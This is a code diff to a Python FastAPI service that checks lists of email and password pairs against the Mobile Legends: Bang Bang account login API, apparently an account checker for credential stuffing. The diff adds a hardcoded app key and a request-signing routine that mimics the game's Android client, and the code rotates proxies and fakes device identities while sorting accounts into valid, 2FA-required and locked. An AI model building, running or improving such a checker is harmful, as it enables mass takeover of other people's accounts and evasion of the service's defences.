@@ -2,7 +2,7 @@ from fastapi import FastAPI, UploadFile, Form, Request, Query
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
-import random, asyncio, traceback
+import random, asyncio, traceback, hashlib, time
 import httpx
 
 app = FastAPI()
@@ -20,11 +20,13 @@ results = {
     "locked_accounts": [],
 }
 
+# MLBB App Key (important for sign)
+APP_KEY = "N0lFaXliVkhwTWdCck5WamFBYVFaazg5V3FGN1V2V1k="  # MLBB Android App Key (fixed one)
+
 # Load proxies
 with open("proxies.txt", "r") as f:
     proxies = [p.strip() for p in f if p.strip()]
 
-# Proxy formatter
 def get_proxy_url():
     raw = random.choice(proxies)
     ip, port, user, pwd = raw.split(":")
@@ -51,6 +53,14 @@ def generate_device_info():
     device_id = str(random.randint(100000000000000, 999999999999999))  # 15 digits
     return device, android_version, device_id
 
+# SIGN generator
+def generate_sign(password):
+    random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
+    timestamp = str(int(time.time()))
+    raw = f"{APP_KEY}{random_str}{timestamp}{password}"
+    sign = hashlib.md5(raw.encode()).hexdigest()
+    return random_str, timestamp, sign
+
 async def get_profile(access_token, user_id):
     url = "https://accountmtapi.mobilelegends.com/Account/profile"
     headers = {"Authorization": f"Bearer {access_token}"}
@@ -74,22 +84,25 @@ async def get_profile(access_token, user_id):
 
 async def check_account(email, password):
     device, android_version, device_id = generate_device_info()
+    random_str, timestamp, sign = generate_sign(password)
 
-    login_url = "https://accountmtapi.mobilelegends.com/Account/loginV4"  # <-- Use loginV4!
+    login_url = "https://accountmtapi.mobilelegends.com/Account/loginV4"
     data = {
         "email": email,
         "password": password,
         "os_type": 2,
         "format": 2,
-        "secret": "",
-        "app_key": "6da4b03b2d6b1bc2b202665ebd205a1a",  # <-- Correct app_key
         "device": device,
         "device_id": device_id,
         "app_version": "1.7.82.811.1",
+        "app_key": APP_KEY,
+        "random_str": random_str,
+        "timestamp": timestamp,
+        "sign": sign,
     }
     headers = {
         "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
+        "User-Agent": f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
     }
 
     for _ in range(3):
@@ -117,7 +130,7 @@ async def check_account(email, password):
                         print(f"[+] Valid account: {email}")
                         return "working"
 
-                    elif code == 15001:
+                    elif code == 403:
                         results["2fa_required"] += 1
                         results["2fa_accounts"].append({"email": email, "password": password})
                         print(f"[!] 2FA required: {email}")
